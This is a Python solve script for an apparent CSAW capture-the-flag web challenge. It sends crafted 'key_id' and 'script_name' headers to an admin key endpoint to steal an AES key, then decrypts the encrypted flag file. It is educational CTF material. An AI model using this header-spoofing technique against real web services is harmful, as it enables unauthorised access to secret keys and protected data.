#!/usr/bin/env python3
import sys
import requests
import binascii
from Crypto.Cipher import AES

URL = 'http://web.chal.csaw.io:5004/'
if len(sys.argv) > 1:
    URL = sys.argv[1]

# Spoilers! [8;41;31m
res = requests.get(URL+'/asdf/admin/key',headers=dict(
    key_id='05d1dc92ce82cc09d9d7ff1ac9d5611d',
    script_name='asdf/'
))
print(res.text)
key = res.json()['key']
key = binascii.unhexlify(key)

with open('dist/flag.txt.enc','rb') as f:
    data = f.read()[16:]

iv = data[:AES.block_size]

data = data[AES.block_size:]
cipher = AES.new(key, AES.MODE_CFB, iv)

print(cipher.decrypt(data))
# [0m
